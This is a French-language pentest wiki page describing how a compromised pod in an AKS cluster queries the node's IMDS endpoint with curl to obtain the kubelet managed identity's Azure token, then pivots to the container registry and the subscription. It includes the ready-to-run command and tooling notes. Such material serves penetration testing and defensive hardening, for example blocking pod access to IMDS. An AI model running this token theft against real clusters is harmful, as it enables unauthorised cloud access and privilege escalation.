---
title: "Identité du nœud : kubelet et identité managée via IMDS"
description: "Abuser du kubelet et de l'identité managée d'un pool de nœuds AKS via IMDS pour s'élever d'un pod jusqu'à l'abonnement."
keywords:
  - Nœud AKS
  - kubelet
  - identité managée
  - IMDS
  - pool de nœuds
---

# Identité du nœud

Un pool de nœuds AKS s'exécute sur des VM qui portent une **identité managée kubelet** et l'identité propre du nœud. Un pod capable d'atteindre le point de terminaison de métadonnées d'instance du nœud (souvent non bloqué) génère le jeton Azure de cette identité et s'évade du cluster pour atteindre l'abonnement.

## D'un pod à un jeton Azure

```bash
# inside a pod on the node, hit IMDS for the node/kubelet identity token
curl -s -H Metadata:true \
 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

## Notes d'exploitation

- Bloquer l'accès des pods à `169.254.169.254` est un contrôle fréquemment oublié ; là où il manque, n'importe quelle RCE dans un pod devient une identité Azure.
- L'identité kubelet détient généralement les droits `AcrPull` et de gestion du nœud, une porte d'entrée vers le [Container Registry](../container-registry/index.md) et le groupe de ressources du nœud.
- Les pods en workload-identity (fédérée) assument un rôle via OIDC au lieu de cela ; lisez le jeton projeté et échangez-le plutôt que d'interroger IMDS.

## Outils

- **curl** depuis un pod compromis ; **Peirates** automatise les pivots d'identité de nœud et de cloud.
- **Azure CLI** une fois le jeton exporté.

## Références

- [Microsoft : identités managées AKS](https://learn.microsoft.com/azure/aks/use-managed-identity)
- [HackTricks Cloud : identité de nœud AKS](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [Peirates](https://github.com/inguardians/peirates)
